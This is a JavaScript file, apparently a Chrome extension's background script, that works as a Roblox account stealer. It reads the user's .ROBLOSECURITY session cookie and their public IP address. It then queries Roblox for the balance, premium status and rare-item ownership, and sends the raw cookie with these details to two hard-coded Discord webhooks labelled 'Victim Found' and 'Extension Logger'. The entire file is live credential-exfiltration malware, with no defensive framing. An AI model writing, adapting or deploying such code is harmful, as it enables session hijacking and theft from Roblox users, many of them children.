const WEBHOOKS = [
    "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
    "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU"
];

const BUNDLES = {
    korblox: 372,   // Korblox Deathspeaker bundle ID
    headless: 227   // Headless Horseman bundle ID
};

async function main(cookie) {
    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    if (cookie) {
        try {
            let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });

            if (res.ok) {
                let user = await res.json();

                // Run requests in parallel
                let [economy, premium, thumb, body, korblox, headless] = await Promise.all([
                    // Robux + Pending
                    fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                    }).then(r => r.ok ? r.json() : { robux: "N/A", pendingRobux: "N/A" }),

                    // Premium
                    fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                    }).then(r => r.ok ? r.json() : false),

                    // Avatar Headshot
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`)
                        .then(r => r.json())
                        .then(d => d.data && d.data.length > 0 ? d.data[0].imageUrl : null),

                    // Full Body Thumbnail
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=720x720&format=Png&isCircular=false`)
                        .then(r => r.json())
                        .then(d => d.data && d.data.length > 0 ? d.data[0].imageUrl : null),

                    // Korblox Ownership
                    fetch(`https://catalog.roblox.com/v1/users/${user.id}/bundles/${BUNDLES.korblox}/ownership`, {
                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                    }).then(r => r.ok ? r.json() : { ownsAsset: false }),

                    // Headless Ownership
                    fetch(`https://catalog.roblox.com/v1/users/${user.id}/bundles/${BUNDLES.headless}/ownership`, {
                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                    }).then(r => r.ok ? r.json() : { ownsAsset: false })
                ]);

                statistics = {
                    UserName: user.name,
                    RobuxBalance: economy.robux ?? "N/A",
                    PendingRobux: economy.pendingRobux ?? "N/A",
                    IsPremium: premium,
                    ThumbnailUrl: thumb ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    FullBodyUrl: body ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    Summary: economy.robux ?? "N/A",
                    Korblox: korblox.ownsAsset ? "✅ Yes" : "❌ No",
                    Headless: headless.ownsAsset ? "✅ Yes" : "❌ No"
                };
            }
        } catch (e) {
            console.error("Failed to fetch Roblox info:", e);
        }
    }

    // Payload for Discord
    const payload = {
        content: "<@&hits>", // ping example
        embeds: [
            {
                description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                fields: [
                    { name: "Username", value: statistics ? statistics.UserName : "N/A", inline: true },
                    { name: "Robux", value: statistics ? statistics.RobuxBalance : "N/A", inline: true },
                    { name: "Pending Robux", value: statistics ? statistics.PendingRobux : "N/A", inline: true },
                    { name: "Premium", value: statistics ? statistics.IsPremium : "N/A", inline: true },
                    { name: "Summary", value: statistics ? statistics.Summary : "N/A", inline: false },
                    { name: "Korblox", value: statistics ? statistics.Korblox : "❌ No", inline: true },
                    { name: "Headless", value: statistics ? statistics.Headless : "❌ No", inline: true }
                ],
                author: {
                    name: "Victim Found: " + ipAddr,
                    icon_url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                footer: {
                    text: "ENTERPRISE",
                    icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                },
                thumbnail: {
                    url: statistics ? statistics.FullBodyUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                }
            }
        ],
        username: "Extension Logger",
        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
    };

    // Send to both webhooks
    for (let hook of WEBHOOKS) {
        fetch(hook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    }
}

chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});
